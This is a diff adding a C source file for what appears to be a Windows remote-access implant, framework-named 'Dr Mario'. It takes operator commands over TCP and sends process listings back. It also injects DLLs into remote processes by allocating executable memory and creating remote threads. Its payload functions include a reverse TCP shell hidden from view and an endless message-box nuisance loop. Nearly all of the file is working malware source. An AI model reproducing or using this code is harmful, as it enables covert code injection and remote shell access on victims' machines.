@@ -1,0 +1,313 @@
+#!name##DrMarioBase_C
+#!itemType##sfile
+#!info##Dr Mario base C file.
+#!lang##c
+#!addNameComp##True
+
+
+#include "drMario_base.h"
+
+#define DR_MARIO_PID_LIST_SIZE 1024
+#define DR_MARIO_PART_PROC_NAME_BUFF 256
+
+HMODULE drMario_MAIN_MODULE;
+
+
+void drMario_free_commander_msg(pDR_MARIO_COMMANDER_MSG cmsg) {
+    if (cmsg->raw_cmd != 0) {
+        free(cmsg->raw_cmd);
+    }
+    cmsg->rmsg->free(cmsg->rmsg);
+}
+
+
+pDR_MARIO_COMMANDER_MSG drMario_make_commander_msg(pROBBO_TCP_MESSAGES rmsg, pDR_MARIO_COMMANDER_CONSOLE dr_mario) {
+    pDR_MARIO_COMMANDER_MSG cmd_msg = malloc(sizeof(DR_MARIO_COMMANDER_MSG));
+    memset(cmd_msg, 0, sizeof(DR_MARIO_COMMANDER_MSG));
+    cmd_msg->console = dr_mario;
+    cmd_msg->rmsg = rmsg;
+    cmd_msg->types = cmd_msg->rmsg->types;
+    if (cmd_msg->types == 2) {
+        cmd_msg->is_file_FLAG = 1;
+    }
+    if (cmd_msg->types == 1) {
+        cmd_msg->raw_cmd = malloc(cmd_msg->rmsg->msg_size + 1);
+        memset(cmd_msg->raw_cmd, 0, cmd_msg->rmsg->msg_size + 1);
+        strcpy(cmd_msg->raw_cmd, cmd_msg->rmsg->data);
+        cmd_msg->dlimit = strtok(cmd_msg->raw_cmd, " ");
+        cmd_msg->main_cmd = cmd_msg->dlimit;
+        cmd_msg->dlimit = strtok(NULL, " ");
+        cmd_msg->arg1 = cmd_msg->dlimit;
+        cmd_msg->dlimit = strtok(NULL, " ");
+        cmd_msg->arg2 = cmd_msg->dlimit;
+        cmd_msg->dlimit = strtok(NULL, " ");
+        cmd_msg->arg3 = cmd_msg->dlimit;
+    }
+
+    cmd_msg->clean = drMario_free_commander_msg;
+    getcwd(dr_mario->currentDir, DR_MARIO_CMD_CURRENT_DIR_BUFF);
+    return cmd_msg;
+}
+
+void drMario_free_pid_list(pDR_MARIO_PROC_PID_LIST pid_list) {
+    free(pid_list->list);
+    free(pid_list);
+}
+
+pDR_MARIO_PROC_PID_LIST drMario_get_pid_list(void) {
+    DWORD *raw_buff = malloc(DR_MARIO_PID_LIST_SIZE * sizeof(DWORD));
+    memset(raw_buff, 0, DR_MARIO_PID_LIST_SIZE * sizeof(DWORD));
+    DWORD *pids = malloc(DR_MARIO_PID_LIST_SIZE * sizeof(DWORD));
+    memset(pids, 0, DR_MARIO_PID_LIST_SIZE * sizeof(DWORD));
+    DWORD bwritten;
+    robbo_wapi_EnumProcesses(raw_buff, DR_MARIO_PID_LIST_SIZE, &bwritten);
+    int pIndex = 0;
+    for (int i=0;i<DR_MARIO_PID_LIST_SIZE;i++) {
+        if (raw_buff[i] == 0 & raw_buff[i+1] == 0) {
+            break;
+        }
+        if (raw_buff[i] == 0) {
+            continue;
+        }
+        pids[pIndex] = raw_buff[i];
+        pIndex++;
+    }
+    free(raw_buff);
+    pDR_MARIO_PROC_PID_LIST pid_list = malloc(sizeof(DR_MARIO_PROC_PID_LIST));
+    memset(pid_list, 0, sizeof(DR_MARIO_PROC_PID_LIST));
+    pid_list->free = drMario_free_pid_list;
+    pid_list->list = pids;
+    pid_list->size = pIndex;
+    return pid_list;
+}
+
+void drMario_get_proc_list(pDR_MARIO_COMMANDER_MSG cmsg) {
+    pDR_MARIO_PROC_PID_LIST pids = drMario_get_pid_list();
+    char *proc_list = malloc(pids->size * DR_MARIO_PART_PROC_NAME_BUFF);
+    memset(proc_list, 0, pids->size * DR_MARIO_PART_PROC_NAME_BUFF);
+    char intro[128];
+    robbo_decode2(drm_help_proc_list, intro, 128);
+    strcat(proc_list, intro);
+    strcat(proc_list, "\n");
+    char paBuff[128];
+    char buff[256];
+    HANDLE proc;
+    for (int i=0; i<pids->size; i++) {
+        proc = robbo_locust_open_process_info(pids->list[i]);
+        if (proc == 0) {
+            continue;
+        }
+        robbo_wapi_GetModuleBaseNameA(proc, 0, paBuff, 128);
+        sprintf(buff, "### NAME: %s ### PID: %d ###\n", paBuff, pids->list[i]);
+        strcat(proc_list, buff);
+        robbo_wapi_NtClose(proc);
+    }
+    pids->free(pids);
+    rtcp_send_text_msg(cmsg->console->main_sock, proc_list, 0);
+    free(proc_list);
+}
+
+DWORD drMario_find_process_pid(char* proc_name) {
+    pDR_MARIO_PROC_PID_LIST pid_list = drMario_get_pid_list();
+    HANDLE proc;
+    char buff[256];
+    int tar_pid = -1;
+    for (int i=0;i<pid_list->size;i++) {
+        proc = robbo_locust_open_process_info(pid_list->list[i]);
+        if (proc == 0) {
+            continue;
+        }
+        robbo_wapi_GetModuleBaseNameA(proc, 0, buff, 256);
+        robbo_wapi_NtClose(proc);
+        if (strcmp(buff, proc_name) == 0) {
+            tar_pid = pid_list->list[i];
+            break;
+        }
+    }
+    pid_list->free(pid_list);
+    return tar_pid;
+}
+
+int drMario_inject_dll(char *dll_name, DWORD pid, int file_FLAG) {
+    HANDLE proc = robbo_locust_open_process_full(pid);
+    if (proc == 0) {
+        return 1;
+    }
+    pDR_MARIO_PAYLOAD_LDR_LOAD_DLL load_dll = malloc(sizeof(DR_MARIO_PAYLOAD_LDR_LOAD_DLL));
+    memset(load_dll, 0, sizeof(DR_MARIO_PAYLOAD_LDR_LOAD_DLL));
+    load_dll->load_dll = robbo_faddr_LdrLoadDll();
+    if (file_FLAG == 1) {
+        WCHAR buff[DR_MARIO_DEFAULT_DLL_NAME_BUFF];
+        memset(buff, 0, DR_MARIO_DEFAULT_DLL_NAME_BUFF);
+        robbo_convert_utf16(dll_name, buff, DR_MARIO_DEFAULT_DLL_NAME_BUFF);
+        swprintf(load_dll->dll_name, DR_MARIO_DEFAULT_DLL_NAME_BUFF, L"\\??\\%ls", buff);
+    }
+    else {
+        robbo_convert_utf16(dll_name, load_dll->dll_name, DR_MARIO_DEFAULT_DLL_NAME_BUFF);
+    }
+    robbo_wapi_RtlInitUnicodeString(&load_dll->us_name, load_dll->dll_name);
+    PVOID addr_payload = NULL;
+    SIZE_T mem_payload_size = sizeof(DR_MARIO_PAYLOAD_LDR_LOAD_DLL) + 512;
+    SIZE_T payload_size = sizeof(DR_MARIO_PAYLOAD_LDR_LOAD_DLL);
+    NTSTATUS payAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &addr_payload, 0, &mem_payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (payAlloc != 0) {
+        goto INJ_ERROR;
+    }
+    load_dll->us_name.Buffer = (WCHAR*)addr_payload;
+    SIZE_T payload_progress;
+    NTSTATUS wr_pay_status = robbo_wapi_NtWriteVirtualMemory(proc, addr_payload, load_dll, payload_size, &payload_progress);
+    if (wr_pay_status != 0) {
+        goto INJ_ERROR;
+    }
+
+    PVOID func_addr = NULL;
+    SIZE_T func_size = (char*)drMario_payload_func_ldr_load_dll_end - (char*)drMario_payload_func_ldr_load_dll;
+    SIZE_T mem_func_size = func_size + 128;
+    NTSTATUS funcAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &func_addr, 0, &mem_func_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (funcAlloc != 0) {
+        goto INJ_ERROR;
+    }
+    SIZE_T func_progress;
+    NTSTATUS wr_func_status = robbo_wapi_NtWriteVirtualMemory(proc, func_addr, drMario_payload_func_ldr_load_dll, func_size, &func_progress);
+    if (wr_func_status != 0) {
+        goto INJ_ERROR;
+    }
+
+    HANDLE myTh;
+    NTSTATUS cr_th = robbo_wapi_NtCreateThreadEx(&myTh, THREAD_ALL_ACCESS, 0, proc, func_addr, addr_payload, 0, 0, 0, 0, 0);
+    robbo_wapi_WaitForSingleObject(myTh, INFINITE);
+
+
+    INJ_SUCCES:
+        robbo_wapi_NtClose(proc);
+        free(load_dll);
+        return 0;
+
+    INJ_ERROR:
+        robbo_wapi_NtClose(proc);
+        free(load_dll);
+        return 1;
+
+}
+
+int drMario_inject_dll2(char *dll_name, char *proc_name, int file_FLAG) {
+    DWORD pid = drMario_find_process_pid(proc_name);
+    if (pid == -1) {
+        return 1;
+    }
+    return drMario_inject_dll(dll_name, pid, file_FLAG);
+}
+
+char* drMario_get_dll_path(HMODULE mod_handle) {
+    char *fpath = malloc(1024);
+    memset(fpath, 0, 1024);
+    robbo_wapi_GetModuleFileNameA(mod_handle, fpath, 1024);
+    return fpath;
+}
+
+int drMario_inject_run_dll(char *dll_name, DWORD target_pid, char *dll_func_name) {
+    HANDLE proc = robbo_locust_open_process_full(target_pid);
+    if (proc == 0) {
+        return 1;
+    }
+    pDR_MARIO_PAYLOAD_INJECT_DLL payload = malloc(sizeof(DR_MARIO_PAYLOAD_INJECT_DLL));
+    memset(payload, 0, sizeof(DR_MARIO_PAYLOAD_INJECT_DLL));
+    payload->load_dll = robbo_faddr_LdrLoadDll();
+    payload->getAddr = robbo_get_function_raw("GetProcAddress", robbo_addr_kernel32);
+    strcpy(payload->funcName, dll_func_name);
+    robbo_convert_utf16(dll_name, payload->dll_name, DR_MARIO_DEFAULT_DLL_NAME_BUFF);
+
+    robbo_wapi_RtlInitUnicodeString(&payload->us_name, payload->dll_name);
+    PVOID addr_payload = NULL;
+    SIZE_T mem_payload_size = sizeof(DR_MARIO_PAYLOAD_INJECT_DLL) + 512;
+    SIZE_T payload_size = sizeof(DR_MARIO_PAYLOAD_INJECT_DLL);
+    NTSTATUS payAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &addr_payload, 0, &mem_payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if (payAlloc != 0) {
+        goto INJ_ERROR;
+    }
+    payload->us_name.Buffer = (WCHAR*)addr_payload;
+    SIZE_T payload_progress;
+    NTSTATUS wr_pay_status = robbo_wapi_NtWriteVirtualMemory(proc, addr_payload, payload, payload_size, &payload_progress);
+    if (wr_pay_status != 0) {
+        goto INJ_ERROR;
+    }
+
+    PVOID func_addr = NULL;
+    SIZE_T func_size = (char*)drMario_payload_func_inject_run_dll_end - (char*)drMario_payload_func_inject_run_dll;
+    SIZE_T mem_func_size = func_size + 128;
+    NTSTATUS funcAlloc = robbo_wapi_NtAllocateVirtualMemory(proc, &func_addr, 0, &mem_func_size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    if (funcAlloc != 0) {
+        goto INJ_ERROR;
+    }
+    SIZE_T func_progress;
+    NTSTATUS wr_func_status = robbo_wapi_NtWriteVirtualMemory(proc, func_addr, drMario_payload_func_inject_run_dll, func_size, &func_progress);
+    if (wr_func_status != 0) {
+        goto INJ_ERROR;
+    }
+
+    HANDLE myTh;
+    NTSTATUS cr_th = robbo_wapi_NtCreateThreadEx(&myTh, THREAD_ALL_ACCESS, 0, proc, func_addr, addr_payload, 0, 0, 0, 0, 0);
+    // robbo_wapi_WaitForSingleObject(myTh, INFINITE);
+
+
+    INJ_SUCCES:
+        robbo_wapi_NtClose(proc);
+        free(payload);
+        return 0;
+
+    INJ_ERROR:
+        robbo_wapi_NtClose(proc);
+        free(payload);
+        return 1;
+
+}
+
+// ------------------------------------- PAYLOAD FUNCTION -------------------------------------------
+
+void WINAPI drMario_payload_func_msgbox(pDR_MARIO_PAYLOAD_MSGBOX payload) {
+    while (1) {
+        payload->msgbox(0, payload->text, payload->label, 0);
+        payload->pause_me(2000);
+    }
+}
+
+void WINAPI drMario_payload_func_msgbox_end(void) {
+    return;
+}
+
+HANDLE WINAPI drMario_payload_func_ldr_load_dll(pDR_MARIO_PAYLOAD_LDR_LOAD_DLL payload) {
+    payload->load_dll(0, 0, &payload->us_name, &payload->mod_handle);
+    return payload->mod_handle;
+}
+
+void WINAPI drMario_payload_func_ldr_load_dll_end(void) {
+    return;
+}
+
+HANDLE WINAPI drMario_payload_func_rev_tcp(pDR_MARIO_PAYLOAD_REVERSE_TCP payload) {
+    payload->wsa_startup(0x0202, &payload->wsadata);
+    payload->sock = payload->wsa_socket(AF_INET, SOCK_STREAM, IPPROTO_TCP, 0, 0, 0);
+    payload->connect(payload->sock, (SOCKADDR*)&payload->sockaddr, payload->sockaddr_size);
+    payload->si.hStdInput = (HANDLE)payload->sock;
+    payload->si.hStdOutput = (HANDLE)payload->sock;
+    payload->si.hStdError = (HANDLE)payload->sock;
+    payload->cr_proc(0, payload->app_name, 0, 0, 1, 0x08000000, 0, 0, &payload->si, &payload->pi);
+    payload->wait(payload->pi.hProcess, INFINITE);
+    payload->close_sock(payload->sock);
+}
+
+void WINAPI drMario_payload_func_rev_tcp_end(void) {
+    return;
+}
+
+void WINAPI drMario_payload_func_inject_run_dll(pDR_MARIO_PAYLOAD_INJECT_DLL payload) {
+    payload->load_dll(0, 0, &payload->us_name, &payload->mod_handle);
+    payload->exeFunc = payload->getAddr(payload->mod_handle, payload->funcName);
+    payload->exeFunc();
+    return;
+}
+
+void WINAPI drMario_payload_func_inject_run_dll_end(void) {
+    return;
+}
+
